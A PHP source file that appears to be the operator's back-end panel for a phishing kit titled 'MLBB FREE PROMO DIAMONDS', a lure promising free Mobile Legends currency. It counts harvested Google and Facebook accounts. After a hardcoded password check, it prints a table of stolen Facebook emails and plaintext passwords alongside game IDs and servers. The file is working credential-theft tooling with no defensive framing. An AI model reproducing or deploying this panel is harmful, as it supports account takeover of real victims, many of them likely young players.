<?php
include "connection.php";


?>

<!DOCTYPE HTML>
<html lang="en">
  
  <head>
   <meta charset="utf-8" >
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <title>MLBB FREE PROMO DIAMONDS</title>
    </head>
    
    <body>
              <h3 style="color:yellow;">
        GOOGLE_User:<?php
$sql = "select count(ID) from google";
$query = mysqli_query($conn,$sql);
 $result = mysqli_fetch_assoc($query);
echo $result["count(ID)"];
  ?>
       <br>
       Facebo_User:<?php
     $sql = "select COUNT(ID) from facebook";
$query = mysqli_query($conn,$sql);
 $result = mysqli_fetch_assoc($query);
   echo $result["COUNT(ID)"];
      ?></h3>
      <div id="main">
      <form method="POST">
        <br><label style="color:red;">Enter the Password to login</label>
       <br> <input type="password" name="password"><br>
        <br><input type="submit" value="Enter" name="go"><br>
      
      </form>
      <h1 style="color:lightgreen;">Facebook</h1>
      <table>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>MLID</th>
          <th>MLserver</th>
          </tr>
      <?php 
      if(isset($_POST["go"])){
  $password = "amben2134";
  $cpassword = $_POST["password"];
  if($cpassword == $password){
    $sql = "select * from facebook";
    $query = mysqli_query($conn,$sql);
    while($result = mysqli_fetch_assoc($query)){
 ?>
 <tr>
   <th><?php echo $result["email"]; ?></th>
   <th><?php echo $result["password"]; ?></th>
   <th><?php echo $result["MLID"]; ?></th>
   <th><?php echo $result["server"]; ?></th>
     
   </tr>
 <?php }}
}
      ?>
      </table>
      </div>
      </body>
      </html>